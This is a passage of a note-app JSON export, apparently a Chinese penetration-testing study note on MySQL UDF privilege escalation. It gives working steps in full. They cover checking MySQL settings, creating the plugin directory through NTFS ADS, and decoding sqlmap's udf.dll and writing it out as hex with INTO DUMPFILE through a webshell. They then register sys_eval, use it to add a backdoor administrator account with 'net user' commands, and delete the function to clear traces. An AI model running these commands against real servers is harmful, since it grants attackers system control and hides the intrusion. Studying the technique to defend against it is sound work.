winmgmt"}]},{"ID":"20241028111033-agg9q90","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","id":"20241028111033-agg9q90","updated":"20241028111039"},"Children":[{"Type":"NodeText","Data":"UDF提权"}]},{"ID":"20241028111140-ay2euaa","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241028111140-ay2euaa","updated":"20241028111144"},"Children":[{"Type":"NodeText","Data":"原理"}]},{"ID":"20241029140325-kh5wx2h","Type":"NodeBlockquote","Properties":{"fold":"1","heading-fold":"1","id":"20241029140325-kh5wx2h","updated":"20241029140401"},"Children":[{"ID":"20241028111157-nfwz2hy","Type":"NodeParagraph","Properties":{"id":"20241028111157-nfwz2hy","updated":"20241029140333"},"Children":[{"Type":"NodeText","Data":"UDF(User Defined Function)"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"用户自定义函数"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，支持用户自定义"}]},{"ID":"20241029140327-hiehrdu","Type":"NodeParagraph","Properties":{"id":"20241029140327-hiehrdu","updated":"20241029140344"},"Children":[{"Type":"NodeText","Data":"通过添加新的函数，对mysql服务器进行功能扩充，从而创建函数，将MYSQL账号转化为"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"系统system权限"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029140329-jbwduu6","Type":"NodeParagraph","Properties":{"id":"20241029140329-jbwduu6","updated":"20241029140401"},"Children":[{"Type":"NodeText","Data":"UDF提权是"},{"Type":"NodeTextMark","TextMarkType":"u","TextMarkTextContent":"通过"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"u text","TextMarkTextContent":"root权限导出udf.dll到系统目录"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeTextMark","TextMarkType":"u","TextMarkTextContent":"下，可以通过"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"u text","TextMarkTextContent":"udf.dl调用执行cmd"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241028111335-7045h2d","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241028111335-7045h2d","updated":"20241028111339"},"Children":[{"Type":"NodeText","Data":"利用条件"}]},{"ID":"20241028111342-hv6y6u9","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028111342-hv6y6u9","updated":"20241029140449"},"Children":[{"Type":"NodeText","Data":"1."},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"Windows 2000、XP、2003"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029140418-mghd006","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029140418-mghd006","updated":"20241029140454"},"Children":[{"Type":"NodeText","Data":"2.MySQL"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"数据库版本"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029140420-rt65a2z","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029140420-rt65a2z","updated":"20241029140459"},"Children":[{"Type":"NodeText","Data":"3."},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"账号"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"具有对MySQL的"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"插入和删除权限"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029140422-u381tuf","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029140422-u381tuf","updated":"20241029140509"},"Children":[{"Type":"NodeText","Data":"4.可以将udf.dll"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"写入到相应目录"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"的权限"}]},{"ID":"20241029140514-xqry74b","Type":"NodeTable","TableAligns":[0,0,0],"Properties":{"colgroup":"min-width: 60px;|min-width: 60px;|min-width: 60px;","fold":"1","heading-fold":"1","id":"20241029140514-xqry74b","updated":"20241029140817"},"Children":[{"Type":"NodeTableHead","Data":"thead","Children":[{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"数据库版本"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"操作系统"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"udf.dll文件导出路径"}]}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"\u003c5.0"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"所有操作系统"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"导出路径随意"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Properties":{"colspan":"1","rowspan":"2"},"Children":[{"Type":"NodeKramdownSpanIAL","Data":"{: colspan=\"1\" rowspan=\"2\"}"},{"Type":"NodeText","Data":"\u003c=5.1"}]},{"Type":"NodeTableCell","Data":"td","Properties":{"colspan":"1","rowspan":"2"},"Children":[{"Type":"NodeKramdownSpanIAL","Data":"{: colspan=\"1\" rowspan=\"2\"}"},{"Type":"NodeText","Data":"windows2003"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeText","Data":"windows2000"}]},{"Type":"NodeTableCell","Data":"td","Properties":{"colspan":"1","rowspan":"2"},"Children":[{"Type":"NodeKramdownSpanIAL","Data":"{: colspan=\"1\" rowspan=\"2\"}"},{"Type":"NodeText","Data":"c:"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"\\windows"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"\\system\\udf.dll"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeText","Data":"c:"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"\\winnt"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"\\system32\\udf.dll"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Properties":{"class":"fn__none"},"Children":[{"Type":"NodeKramdownSpanIAL","Data":"{: class=\"fn__none\"}"}]},{"Type":"NodeTableCell","Data":"td","Properties":{"class":"fn__none"},"Children":[{"Type":"NodeKramdownSpanIAL","Data":"{: class=\"fn__none\"}"}]},{"Type":"NodeTableCell","Data":"td","Properties":{"class":"fn__none"},"Children":[{"Type":"NodeKramdownSpanIAL","Data":"{: class=\"fn__none\"}"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"\u003e5.1"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"所有操作系统"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"MySQL安装目录下的"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"lib\\plugin\\"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"udf.dll"},{"Type":"NodeBr","Data":"br"},{"Type":"NodeText","Data":"通过语句查询："},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"select @@plugin_dir"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]}]}]},{"ID":"20241028111202-sjo116f","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241028111202-sjo116f","updated":"20241029152301"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"步骤"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241028111209-jq61c2r","Type":"NodeList","ListData":{},"Properties":{"fold":"1","heading-fold":"1","id":"20241028111209-jq61c2r","updated":"20241029163107"},"Children":[{"ID":"20241029141434-00hs5n8","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029141434-00hs5n8"},"Children":[{"ID":"20241029141434-ep26wwy","Type":"NodeParagraph","Properties":{"id":"20241029141434-ep26wwy","updated":"20241029141612"},"Children":[{"Type":"NodeText","Data":"判断条件，注意操作系统版本"}]},{"ID":"20241029141447-bq2sea9","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029141447-bq2sea9","updated":"20241029141949"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"SELECT version();                          #查看数据库版本\nSELECT user();                             #查看数据库用户\nSELECT @@basedir;                          #查看数据库安装目录\nshow global variables like \"secure%\";      #查看secure-file-priv是否有目录限制\nshow variables like 'plugin%';             #查看plugin目录是否存在\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029141636-4r4koa2","Type":"NodeParagraph","Properties":{"id":"20241029141636-4r4koa2","updated":"20241029141704"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 25%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029141636-odtac0e.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 25%;\"}"},{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 33%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029141648-lh6y9cs.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 33%;\"}"},{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 33%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029141700-izcgd65.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 33%;\"}"}]},{"ID":"20241029141954-eq3xu1i","Type":"NodeList","ListData":{},"Properties":{"id":"20241029141954-eq3xu1i"},"Children":[{"ID":"20241029141952-ck9zdcf","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029141952-ck9zdcf"},"Children":[{"ID":"20241029141952-jwitp18","Type":"NodeParagraph","Properties":{"id":"20241029141952-jwitp18","updated":"20241029142014"},"Children":[{"Type":"NodeText","Data":"PS：MySQL版本高于5.1，创建导出的文件夹"}]},{"ID":"20241029142015-2cxqeuk","Type":"NodeList","ListData":{},"Properties":{"id":"20241029142015-2cxqeuk"},"Children":[{"ID":"20241029142015-cenog8n","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029142015-cenog8n"},"Children":[{"ID":"20241029142015-7jif96t","Type":"NodeParagraph","Properties":{"id":"20241029142015-7jif96t","updated":"20241029142040"},"Children":[{"Type":"NodeText","Data":"/lib/plugin目录"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"本身是不存在"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"的，可以利用"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"NTFS ADS流"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"来创建文件夹"}]},{"ID":"20241029142046-sd6w7qj","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029142046-sd6w7qj","updated":"20241029142144"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"select 'xxx' into dumpfile 'MySQL目录\\\\lib::$INDEX_ALLOCATION';\nselect 'xxx' into dumpfile 'MySQL目录\\\\lib\\\\plugin::$INDEX_ALLOCATION';\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]}]},{"ID":"20241029142042-o3v7cxx","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029142042-o3v7cxx"},"Children":[{"ID":"20241029142042-0bkwp79","Type":"NodeParagraph","Properties":{"id":"20241029142042-0bkwp79","updated":"20241029142217"},"Children":[{"Type":"NodeText","Data":"也可以结合webshell直接在MySQL安装路径下创建plugin目录"}]}]}]}]}]}]},{"ID":"20241029140841-uhbdpd4","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029140841-uhbdpd4","updated":"20241029163107"},"Children":[{"ID":"20241029140841-4xyo0zt","Type":"NodeParagraph","Properties":{"id":"20241029140841-4xyo0zt","updated":"20241029141431"},"Children":[{"Type":"NodeText","Data":"导出DLL文件，将DLL文件导出到指定目录下；"}]},{"ID":"20241029142230-9j8r00b","Type":"NodeList","ListData":{},"Properties":{"id":"20241029142230-9j8r00b","updated":"20241029163107"},"Children":[{"ID":"20241029142229-1h5nn1m","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029142229-1h5nn1m","updated":"20241029163107"},"Children":[{"ID":"20241029142229-uvbmwmy","Type":"NodeParagraph","Properties":{"id":"20241029142229-uvbmwmy","updated":"20241029142233"},"Children":[{"Type":"NodeText","Data":"获取方法"}]},{"ID":"20241029142234-9mf580m","Type":"NodeList","ListData":{},"Properties":{"id":"20241029142234-9mf580m","updated":"20241029163107"},"Children":[{"ID":"20241029142234-0v3ifze","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029142234-0v3ifze"},"Children":[{"ID":"20241029142234-0z1331j","Type":"NodeParagraph","Properties":{"id":"20241029142234-0z1331j","updated":"20241029142318"},"Children":[{"Type":"NodeText","Data":"在sqlmap/data/udf/mysql/目录下，在Windows目录中有32位和64位dll文件（MySQL位数）"}]}]},{"ID":"20241029142321-9p17m1c","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029142321-9p17m1c"},"Children":[{"ID":"20241029142321-g8qwz4q","Type":"NodeParagraph","Properties":{"id":"20241029142321-g8qwz4q","updated":"20241029142402"},"Children":[{"Type":"NodeText","Data":"文件夹中的dll文件是通过异或编码的，可以使用sqlmap/extra/cloak.py进行解密"}]}]},{"ID":"20241029162533-wi9d25j","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029162533-wi9d25j","updated":"20241029163107"},"Children":[{"ID":"20241029162533-2qwuf7k","Type":"NodeParagraph","Properties":{"id":"20241029162533-2qwuf7k","updated":"20241029163107"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text strong","TextMarkTextContent":"修改"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029162714-ljrv69a","Type":"NodeBlockquote","Properties":{"id":"20241029162714-ljrv69a","updated":"20241029162808"},"Children":[{"ID":"20241029162714-mejanhf","Type":"NodeParagraph","Properties":{"id":"20241029162714-mejanhf","updated":"20241029162720"},"Children":[{"Type":"NodeText","Data":"将udf文件放到指定位置（Mysql\u003e5.1放在Mysql根目录的lib\\plugin文件夹下）从udf文件中引入自定义函数(user defined function)执行自定义函数先看第一步，拿到一个网站的webshell之后，在指定位置创建udf文件。如何创建？先别忘了，现在连源udf文件都没有。\nsqlmap中有现成的udf文件，分为32位和64位，一定要选择对版本，否则会显示：Can‘t open shared library ‘udf.dll‘。\n获取sqlmap的udf请看链接：MySQL 利用UDF执行命令/52413974然后将获得的udf.dll文件转换成16进制，"}]},{"ID":"20241029162748-o6184n2","Type":"NodeParagraph","Properties":{"id":"20241029162748-o6184n2"},"Children":[{"Type":"NodeText","Data":"一种思路是在本地使用mysql函数hex："}]},{"ID":"20241029162753-hjfpkoc","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029162753-hjfpkoc","updated":"20241029162808"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"SELECT hex(load_file(0x433a5c5c55736572735c5c6b61316e34745c5c4465736b746f705c5c6c69625f6d7973716c7564665f7379732e646c6c)) into dumpfile ‘C:\\\\Users\\\\ka1n4t\\\\Desktop\\\\gg.txt‘; \n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029162714-1x4kisf","Type":"NodeParagraph","Properties":{"id":"20241029162714-1x4kisf","updated":"20241029162714"},"Children":[{"Type":"NodeText","Data":"load_file中的十六进制是C:"},{"Type":"NodeBackslash","Data":"span","Children":[{"Type":"NodeBackslashContent","Data":"\\"}]},{"Type":"NodeText","Data":"Users"},{"Type":"NodeBackslash","Data":"span","Children":[{"Type":"NodeBackslashContent","Data":"\\"}]},{"Type":"NodeText","Data":"ka1n4t"},{"Type":"NodeBackslash","Data":"span","Children":[{"Type":"NodeBackslashContent","Data":"\\"}]},{"Type":"NodeText","Data":"Desktop"},{"Type":"NodeBackslash","Data":"span","Children":[{"Type":"NodeBackslashContent","Data":"\\"}]},{"Type":"NodeText","Data":"lib_mysqludf_sys.dll此时gg.txt文件的内容就是udf文件的16进制形式。接下来就是把本地的udf16进制形式通过我们已经获得的webshell传到目标主机上。"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241029162537-rkykq63","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029162537-rkykq63","updated":"20241029162841"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"1. CREATE TABLE udftmp (c blob); //新建一个表，名为udftmp，用于存放本地传来的udf文件的内容。\n2. INSERT INTO udftmp values(unhex(‘udf文件的16进制格式‘)); //在udftmp中写入udf文件内容\n3. SELECT c FROM udftmp INTO DUMPFILE ‘H:\\\\PHPStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin\\\\udf.dll‘; //将udf文件内容传入新建的udf文件中，路径根据自己的@@basedir修改\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]}]}]}]},{"ID":"20241029142411-7675zgs","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029142411-7675zgs"},"Children":[{"ID":"20241029142411-q6bd0ha","Type":"NodeParagraph","Properties":{"id":"20241029142411-q6bd0ha","updated":"20241029142437"},"Children":[{"Type":"NodeText","Data":"将dll文件上传到mysql的/lib/plugin目录下"}]}]}]}]},{"ID":"20241029143048-zpfha15","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029143048-zpfha15","updated":"20241029162900"},"Children":[{"ID":"20241029143050-tz9yk87","Type":"NodeParagraph","Properties":{"id":"20241029143050-tz9yk87","updated":"20241029162900"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"创建临时表存放DLL/SO文件的十六进制内容"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029143050-lscwqvy","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029143050-lscwqvy","style":"color: var(--b3-font-color9);","updated":"20241029143050"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"CREATE TABLE wugua(shellcode BLOB);\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029143054-dxu95kh","Type":"NodeParagraph","Properties":{"id":"20241029143054-dxu95kh","updated":"20241029143106"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 37%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028185038-cm04jw5.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 37%;\"}"},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20241029140918-yla8bt7","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029140918-yla8bt7","updated":"20241029141003"},"Children":[{"ID":"20241029140918-2y4ldsc","Type":"NodeParagraph","Properties":{"id":"20241029140918-2y4ldsc","style":"color: var(--b3-font-color9);","updated":"20241029141003"},"Children":[{"Type":"NodeText","Data":"执行SQL语句创建自定义函数："}]},{"ID":"20241029142608-vyzlb1g","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029142608-vyzlb1g","updated":"20241029142608"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"create function sys_eval returns string soname \"udf.dll\";  //syseval是自定义函数，PS必须是udf.dll文件中有的定义函数，returns String是指返回值的类型，soname指定了包含该函数实现的共享库的名称，这里udf.dll是这个共享库的文件名\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029143136-l0pboyg","Type":"NodeParagraph","Properties":{"id":"20241029143136-l0pboyg","updated":"20241029143140"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 33%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028191444-m3w0qg3.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 33%;\"}"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 33%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028191632-ysc3ukl.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 33%;\"}"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 33%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028191702-bhuex0y.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 33%;\"}"},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029142619-mtk5zb5","Type":"NodeParagraph","Properties":{"id":"20241029142619-mtk5zb5","updated":"20241029142711"},"Children":[{"Type":"NodeText","Data":"PS:需要创建dll文件中存在的函数，可以使用十六进制编辑器打开dll文件，可以查看到可利用的函数"}]},{"ID":"20241029142722-8ilikxs","Type":"NodeParagraph","Properties":{"id":"20241029142722-8ilikxs","updated":"20241029142737"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 41%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029142722-eojy1r0.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 41%;\"}"},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20241029142555-wrn1f96","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029142555-wrn1f96","updated":"20241029143148"},"Children":[{"ID":"20241029142555-kh5fucp","Type":"NodeParagraph","Properties":{"id":"20241029142555-kh5fucp","updated":"20241029142614"},"Children":[{"Type":"NodeText","Data":"执行函数，创建账号并提升为管理员权限"}]},{"ID":"20241029142914-obi7pdc","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029142914-obi7pdc","updated":"20241029143148"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"select sys_eval(\"net user admingua1 123.com /add\");\nselect sys_eval(\"net localgroup administrators admingua1 /add\");\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]}]},{"ID":"20241029142907-0vnbmh9","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029142907-0vnbmh9","updated":"20241029152243"},"Children":[{"ID":"20241029142907-kv63job","Type":"NodeParagraph","Properties":{"id":"20241029142907-kv63job","updated":"20241029142912"},"Children":[{"Type":"NodeText","Data":"清理痕迹"}]},{"ID":"20241029142926-k69f19b","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029142926-k69f19b","updated":"20241029143000"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"drop function sys_eval;\ndelete from mysql.func where name=\"sys_eval\";\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029152227-xclavwm","Type":"NodeParagraph","Properties":{"id":"20241029152227-xclavwm","updated":"20241029152243"},"Children":[{"Type":"NodeText","Data":"​​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 33%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029152240-ryqdbwy.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 